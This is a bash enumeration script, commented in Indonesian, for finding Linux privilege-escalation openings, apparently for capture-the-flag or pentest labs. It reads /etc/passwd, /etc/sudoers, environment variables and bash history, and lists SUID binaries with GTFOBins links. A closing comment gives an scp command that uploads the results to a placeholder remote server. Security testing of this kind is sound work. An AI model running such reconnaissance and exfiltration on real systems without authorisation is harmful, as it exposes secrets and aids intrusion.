#!/bin/bash

# Judul: Linux Privilege Escalation Enumeration Script
# Deskripsi: Mengumpulkan informasi sistem dan potensi konfigurasi yang salah untuk eskalasi hak istimewa
# Penulis: Nama Anda
# Tanggal: YYYY-MM-DD

OUTPUT="enum-results.txt"
echo "############################################" > $OUTPUT
echo "[+] Mengumpulkan informasi sistem..." | tee -a $OUTPUT

echo "############################################"
echo "[+] Hostname:" | tee -a $OUTPUT
echo "############################################"
hostname | tee -a $OUTPUT

echo "############################################"
echo "[+] Informasi kernel:" | tee -a $OUTPUT
echo "############################################"
uname -a | tee -a $OUTPUT

echo "############################################"
echo "[+] Informasi rilis OS:" | tee -a $OUTPUT
echo "############################################"
cat /etc/*release | tee -a $OUTPUT

echo "############################################"
echo "[+] Pengguna saat ini:" | tee -a $OUTPUT
echo "############################################"
whoami | tee -a $OUTPUT

echo "############################################"
echo "[+] ID pengguna saat ini dan grup:" | tee -a $OUTPUT
echo "############################################"
id | tee -a $OUTPUT

echo "############################################"
echo "[+] Variabel lingkungan:" | tee -a $OUTPUT
echo "############################################"
env | tee -a $OUTPUT

echo "############################################"
echo "[+] Direktori saat ini:" | tee -a $OUTPUT
echo "############################################"
pwd | tee -a $OUTPUT

echo "############################################"
echo "[+] Isi direktori home:" | tee -a $OUTPUT
echo "############################################"

if [ -r /etc/passwd ]; then
    users=$(cut -d: -f1,6 /etc/passwd | grep "/home" | cut -d: -f2)
    for home in $users; do
        echo "############################################"
        echo "[+] Isi direktori home $home:" | tee -a $OUTPUT
        echo "############################################"
        ls -la $home | tee -a $OUTPUT
    done
else
    for home in /home/*; do
        if [ -d "$home" ]; then
            echo "############################################"
            echo "[+] Isi direktori home $home:" | tee -a $OUTPUT
            echo "############################################"
            ls -la $home | tee -a $OUTPUT
        fi
    done
fi

# check if there is a root user
echo "Lanjutkan dengan memeriksa pengguna root? (y/n): "
read choice
if [ "$choice" = "y" ]; then
    echo "############################################"
    echo "[+] Pengguna root:" | tee -a $OUTPUT
    echo "############################################"
    cat /etc/passwd | grep "/bin/bash" | cut -d: -f1 | tee -a $OUTPUT
fi

# check flag files readable by current user
echo "Lanjutkan dengan memeriksa file flag yang dapat dibaca oleh pengguna saat ini? (y/n): "
read choice
if [ "$choice" = "y" ]; then
    echo "############################################"
    echo "[+] File flag yang dapat dibaca oleh pengguna saat ini:" | tee -a $OUTPUT
    echo "############################################"
    find / -type f -name "flag*" 2>/dev/null | while read -r flag; do
        echo "$flag" | tee -a $OUTPUT
        cat $flag | tee -a $OUTPUT
    done
fi

echo "Lanjutkan dengan memeriksa binary SUID? (y/n): "
read choice
if [ "$choice" = "y" ]; then
    echo "############################################"
    echo "[+] Memeriksa binary SUID..." | tee -a $OUTPUT
    echo "############################################"
    find / -perm -4000 -type f 2>/dev/null | while read -r binary; do
        echo "$binary (https://gtfobins.github.io/#$(basename $binary))" | tee -a $OUTPUT
    done
fi



echo "Lanjutkan dengan memeriksa binary SGID? (y/n): "
read choice
if [ "$choice" = "y" ]; then
    echo "############################################"
    echo "[+] Memeriksa binary SGID..." | tee -a $OUTPUT
    echo "############################################"
    find / -perm -2000 -type f 2>/dev/null | while read -r binary; do
        echo "$binary (https://gtfobins.github.io/#$(basename $binary))" | tee -a $OUTPUT
    done
fi

echo "Lanjutkan dengan memeriksa file yang dapat ditulis oleh semua pengguna? (y/n): "
read choice
if [ "$choice" = "y" ]; then
    echo "############################################"
    echo "[+] File yang dapat ditulis oleh semua pengguna:" | tee -a $OUTPUT
    echo "############################################"
    find / -type f -perm -o+w 2>/dev/null | tee -a $OUTPUT
fi


echo "Lanjutkan dengan memeriksa service yang berjalan? (y/n): "
read choice
if [ "$choice" = "y" ]; then
    echo "############################################"
    echo "[+] Service yang berjalan:" | tee -a $OUTPUT
    echo "############################################"
    ps aux | tee -a $OUTPUT
fi


echo "Lanjutkan dengan memeriksa cron jobs? (y/n): "
read choice
if [ "$choice" = "y" ]; then
    echo "############################################"
    echo "[+] Cron jobs:" | tee -a $OUTPUT
    echo "############################################"
    crontab -l | tee -a $OUTPUT
fi


echo "Lanjutkan dengan memeriksa sudoers? (y/n): "
read choice
if [ "$choice" = "y" ]; then
    echo "############################################"
    echo "[+] Sudoers:" | tee -a $OUTPUT
    echo "############################################"
    cat /etc/sudoers | tee -a $OUTPUT
fi


echo "Lanjutkan dengan memeriksa network? (y/n): "
read choice
if [ "$choice" = "y" ]; then
    echo "############################################"
    echo "[+] Network:" | tee -a $OUTPUT
    echo "############################################"
    netstat -antup | tee -a $OUTPUT
fi


echo "Lanjutkan dengan memeriksa software yang terinstall? (y/n): "
read choice
if [ "$choice" = "y" ]; then
    echo "############################################"
    echo "[+] Software yang terinstall:" | tee -a $OUTPUT
    echo "############################################"
    dpkg -l | tee -a $OUTPUT
fi

echo "Lanjutkan dengan memeriksa history? (y/n): "
read choice
if [ "$choice" = "y" ]; then
    echo "############################################"
    echo "[+] History:" | tee -a $OUTPUT
    echo "############################################"
    cat ~/.bash_history | tee -a $OUTPUT
fi

echo "############################################"
echo "[+] Enumeration selesai. Hasil disimpan di $OUTPUT."
echo "############################################"

# Opsional: Unggah hasil ke server remote (gunakan dengan hati-hati)
# scp $OUTPUT user@remote-server:/path/to/save/
